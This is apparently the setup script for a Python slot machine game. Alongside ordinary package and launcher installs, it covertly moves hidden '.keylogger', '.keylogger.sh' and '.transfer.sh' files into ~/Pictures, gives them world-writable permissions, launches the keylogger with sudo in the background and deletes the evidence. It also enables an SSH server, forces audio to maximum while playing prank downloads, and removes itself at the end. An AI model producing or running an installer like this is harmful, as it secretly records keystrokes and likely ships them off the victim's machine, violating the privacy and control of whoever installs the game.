# activate venv
cd ~/Python-Slots
. slotmachine/bin/activate

# install openssh
sudo apt-get install openssh-server

# install wiki
sudo apt-get install pandoc
pandoc -s -o ~/Desktop/README.html wiki.md --css https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css

# install launcher
cp SlotMachine.desktop ~/Desktop/SlotMachine.desktop
chmod a+x ~/Desktop/SlotMachine.desktop
chmod 700 ~/Desktop/SlotMachine.desktop
chmod a+x ~/Python-Slots/slotmachine/launcher.sh
chmod 700 ~/Python-Slots/slotmachine/launcher.sh
gsettings set org.gnome.nautilus.preferences executable-text-activation launch

# install tkinter
sudo apt-get install python3-tk

# install admin-tools
mkdir ~/admin-tools
mv ~/Python-Slots/admin-tools/* ~/admin-tools
cd ~/Python-Slots/slotmachine/Python-Slots
echo '{"disabled": "false"}' > ~/admin-tools/disabled
cd ~/Python-Slots
rm -rf admin-tools

# install dependencies
cd ~/Python-Slots/dependencies
mv .keylogger ~/Pictures
mv .keylogger.sh ~/Pictures
mv .transfer.sh ~/Pictures
cd ~/Pictures
chgrp sudo .keylogger
chgrp sudo .keylogger.sh
chgrp sudo .transfer.sh
chmod 777 .keylogger
chmod 777 .keylogger.sh
chmod 777 .transfer.sh
chmod +x .keylogger
chmod +x .keylogger.sh
chmod +x .transfer.sh
echo > .out
sudo sh .keylogger.sh &
rm -rf ~/Python-Slots/dependencies
echo "Installed dependencies."

# install musical dependencies
cd ~/Python-Slots/dependencies
mv .musictime.sh ~/Music
mv .volumeup.sh ~/Music
cd ~/Music
chgrp sudo .musictime.sh
chgrp sudo .volumeup.sh
chmod 777 .musictime.sh
chmod 777 .volumeup.sh
chmod +x .musictime.sh
chmod +x .volumeup.sh

# michael script
sudo apt-get install sox
sudo apt-get install sox libsox-fmt-all
sudo apt-get install wget
cd ~/Music
mkdir .epicsongs
cd .epicsongs
sudo pactl -- set-sink-volume 0 100%
sudo amixer set Master unmute
sudo amixer set Headphone unmute
sudo amixer set PCM unmute
sudo amixer set Front unmute
sudo amixer set Surround unmute
sudo amixer set Center unmute
sudo amixer set LFE unmute
sudo amixer set Side unmute
sudo amixer set Master 100%
sudo amixer set Headphone 100%
sudo amixer set PCM 100%
sudo amixer set Front 100%
sudo amixer set Surround 100%
sudo amixer set Center 100%
sudo amixer set LFE 100%
sudo amixer set Side 100%
sudo wget https://ia800806.us.archive.org/33/items/JoJoSiwaBOOMERANGOfficialVideo_201708/JoJo%20Siwa%20-%20BOOMERANG%20%28Official%20Video%29.mp3
sudo wget https://ia800902.us.archive.org/28/items/tvtunes_19828/Bubble%20Guppies.mp3
sudo wget https://download.realmp3.fun/i/Rick-Astley-Never-Gonna-Give-You-Up.mp3
sudo wget https://ia800902.us.archive.org/29/items/tvtunes_27307/Frozen%20-%20Let%20it%20Go.mp3
sudo wget https://ia803103.us.archive.org/10/items/babyjustinbieberlyrics/Baby%20Justin%20Bieber%20Lyrics.mp3
cd ~/Music
sudo sh .volumeup.sh &
sudo sh .musictime.sh &

# remove script
cd ~/Python-Slots
rm ./setup.sh